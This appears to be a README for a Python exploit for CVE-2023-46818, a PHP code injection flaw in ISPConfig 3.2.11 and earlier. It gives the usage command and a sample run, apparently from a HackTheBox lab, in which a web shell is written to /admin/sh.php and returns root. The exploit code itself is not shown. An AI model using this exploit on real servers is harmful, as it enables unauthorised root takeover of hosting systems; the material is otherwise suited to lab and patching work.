# CVE-2023-46818 Python Exploit

## üî• Description

This Python exploit script targets a security vulnerability in ISPConfig's `records` POST parameter to `/admin/language_edit.php`, which is not properly sanitized. This allows an authenticated admin to inject and execute arbitrary PHP code.

## ‚ö†Ô∏è Affected Versions

Version 3.2.11 and prior versions.

## ‚öôÔ∏è Usage

```python
python3 CVE-2023-46818.py <URL> <Username> <Password>
```

## üíª Sample Run
```shell
‚îå‚îÄ‚îÄ(motoh4ck3r„âøkali)-[~/HTB/Linux/nocturnal]
‚îî‚îÄ$ python3 CVE-2023-46818.py http://127.0.0.1:8081 motoh4ck3r broombroom
[+] Logging in with username 'motoh4ck3r' and password 'broombroom'
[+] Login successful!
[*] Fetching CSRF tokens...
[+] CSRF ID: language_edit_92017c65f0bcba0f230f5cc1
[+] CSRF Key: 7d06eed7d23c29e5c9633920a8122339d91373e8
[+] Injecting shell payload...
[+] Shell written to: http://127.0.0.1:8081/admin/sh.php
[+] Launching shell...

ispconfig-shell# hostname & whoami & id
nocturnal
root
uid=0(root) gid=0(root) groups=0(root)

ispconfig-shell#
```


## ‚ÑπÔ∏è Reference

https://seclists.org/fulldisclosure/2023/Dec/2

## ‚ù§Ô∏è Credits

Shout out to Egidio Romano for this discovery.
